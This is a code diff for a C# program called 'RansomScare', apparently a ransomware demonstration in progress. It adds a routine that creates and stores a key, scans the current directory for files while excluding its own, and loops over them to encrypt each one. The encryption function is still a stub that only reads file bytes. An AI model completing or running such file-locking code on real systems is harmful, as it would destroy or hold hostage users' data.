@@ -12,12 +12,39 @@ namespace RansomScare
     {
         public void EncryptFiles()
         {
+            // Generate and save key
             GenerateKey();
+
+            // Retrieve saved key
+            string key = RetrieveKey();
+            
+            // Get list of suitable files in directory
+            List <string> files = ScanFiles();
+
+            // Encrypt files
+            for(int i  = 0; i < files.Count; i++)
+            {
+                EncryptFile(files[i], key);
+            }
         }
 
+        // Directory file scan function
+        // returns list of all files in the directory, excluding RansomScare's own
         private List<string> ScanFiles()
         {
-            List <string> files = new List<string>();
+
+            string directory = Directory.GetCurrentDirectory();
+
+            // Get file names
+            List <string> files = new List<string>(Directory.GetFiles(directory));
+
+            // Remove 'key' and executable to prevent encrypting them
+            files.Remove(directory + "\\key");
+            files.Remove(directory + "\\RansomScare.exe");
+
+            // Exclude .pdb and .exe.config for debug
+            files.Remove(directory + "\\RansomScare.exe.config");
+            files.Remove(directory + "\\RansomScare.pdb");
 
             return files;
         }
@@ -68,26 +95,30 @@ namespace RansomScare
 
         private string RetrieveKey()
         {
-            return "";
+            return File.ReadAllText(Directory.GetCurrentDirectory() + "/key");
         }
 
-        private void EncryptFile(string file)
+        private void EncryptFile(string file, string key)
         {
-
+            // Creates byte array from file
+            byte[] bytes = File.ReadAllBytes(file);
         }
 
         // List printing function for debug
-        private void printList(List<int> list) {
+        private void printList(List<string> list) {
             string output = "[";
             for (int i = 0; i < list.Count; i++)
             {
-                output += list[i].ToString() + ", ";
+                output += list[i] + ", ";
             }
 
-            // Remove final ', ' and add closing square bracket
-            output = output.Substring(0, output.Length - 2) + "]";
-
-            Console.WriteLine(output);
+            // Remove final ', ' if list not empty
+            if (list.Count > 0)
+            {
+                output = output.Substring(0, output.Length - 2);
+            }
+            
+            Console.WriteLine(output + "]");
         }
     }
 }
